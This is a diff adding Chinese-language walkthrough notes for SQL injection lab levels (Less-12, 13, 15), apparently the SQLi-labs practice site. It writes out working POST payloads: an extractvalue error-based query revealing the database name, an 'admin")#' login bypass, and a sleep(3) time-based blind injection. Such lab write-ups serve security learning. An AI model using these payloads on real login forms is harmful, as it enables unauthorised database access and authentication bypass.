@@ -147,4 +147,29 @@ burp 抓包，发现存在三个 post 参数：uname、password、submit；
 
 <br>
 
+### Less-12 错误 POST 双引号注入
+
+双引号使用 extractvalue 报错爆库  
+`uname=admin" and extractvalue(1,concat('~',(select database())))  and " &passwd=admin&submit=Submit`
+
+> 当然也可以使用双引号加括号构造闭合直接注入  
+> 譬如在 username 输入 `admin")#` 直接就可以登陆
+
+<br>
+
+### Less-13 POST 单引号双注
+
+和 less12 一致，双引号改为单引号+右括号即可
+
+<br>
+
+### Less-15 布尔型-时延单引号 POST 盲注
+
+万能钥匙或者时间盲注都可以，这里采用时间盲注  
+`uname=admin' and sleep(3) -- - &passwd=admin&submit=Submit`
+
+<br>
+
+### Less-17 错误更新查询 POST 注入
+
 ### Less-21
